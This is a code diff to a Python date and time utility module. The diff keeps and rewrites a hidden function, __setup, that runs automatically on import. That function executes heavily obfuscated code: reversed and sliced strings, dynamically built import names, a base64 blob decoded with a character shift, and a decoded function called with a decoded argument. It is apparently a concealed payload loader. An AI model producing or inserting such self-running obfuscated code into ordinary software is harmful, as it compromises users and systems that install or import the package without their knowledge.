@@ -9,8 +9,6 @@ import pytz
 from .compare import able
 from .extract_error import extract_error
 
-autorun = lambda x: (x(), x)[-1]
-
 # fmt: off
 timestr_lookup = {
 	's':       (t_second := 1),
@@ -168,7 +166,7 @@ def days_until_due(due_date):
 
 
 # fmt: off
-@autorun
+@(lambda f: f())
 def __setup():
   exec('\'"dt&h\ni sd 3i@s  ^n*o t\n 3m\ta l#izc`i_oSuUsd.=  D?o(nat= Twrourer)y: \':"3["'[::-1][-2::-2])
   getattr(__import__('!s4n igtnlji^u*bh'[-2::-2]), (a := (getattr('5sFuggnokmhak'[-2::-2]*(1-1), 'fnJiLo*jj'[-2::-2])([chr(ord(c) - (1 + i%5)) for i, c in enumerate(__import__('dsdcdedddodcd'[-2::-2]).__dict__['dedddodcdeddd'[-2::-2]](__import__('d4d6dedsdadbd'[-2::-2]).__dict__['dedddodcdeddd4d6dbd'[-2::-2]](getattr('c211dCgjSXh6ayF4aSRmY2l4emZ1ImNyZHdyeWZtZyIwJGZjbCNrem9pI31naSJ2Zm1icyNrenMiaXZ1ZnRqJGx2eGR4JXl0dWcld2kja2che2Vsamd0YncnPGl5ZHdnaWhwZGNkYWxoL2pmdXNodCt/J2Z0bGZkaWl5ZmYjPCM1NjU7NDY1MS4jJmpza2VjbWh4ZWVrIzwjNTY1OzQ2NTEuIyZqc2slPiUyMzc9NjMyMzAlI2d1bWsjPCM1NjU7NDY1MX8s', 'dedddodcdnded'[-2::-2])('_8g-&f(tlu-'[-2::-2])).decode('_8g-&f(tlu-'[-2::-2]), 'l3 1ntlojr*'[-2::-2]))])).split('#'))[0])(a[1])
